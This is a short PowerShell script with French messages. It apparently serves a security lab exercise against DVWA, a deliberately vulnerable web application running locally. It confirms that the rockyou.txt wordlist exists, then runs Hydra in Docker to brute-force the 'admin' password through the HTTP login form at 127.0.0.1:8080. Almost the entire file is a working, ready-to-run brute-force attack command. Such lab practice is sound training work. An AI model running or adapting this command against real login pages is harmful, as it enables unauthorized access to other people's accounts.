# scripts\hydra_attack.ps1
Write-Host "=== ATTAQUE HYDRA SUR DVWA ===" -ForegroundColor Green

# Vérifier que rockyou.txt existe
if (Test-Path "rockyou.txt") {
    Write-Host "Fichier rockyou.txt trouvé" -ForegroundColor Green
} else {
    Write-Host "Fichier rockyou.txt non trouvé!" -ForegroundColor Red
    exit
}

Write-Host "Début de l'attaque par force brute..." -ForegroundColor Yellow

# Commande Hydra corrigée
docker run --rm `
    -v ${PWD}:/data `
    vanhauser/hydra `
    hydra -l admin -P /data/rockyou.txt `
    127.0.0.1 -s 8080 `
    http-post-form "/login.php:user=^USER^&pass=^PASS^&Login=Login:Login failed" `
    -V -t 4

Write-Host "Attaque terminée" -ForegroundColor Green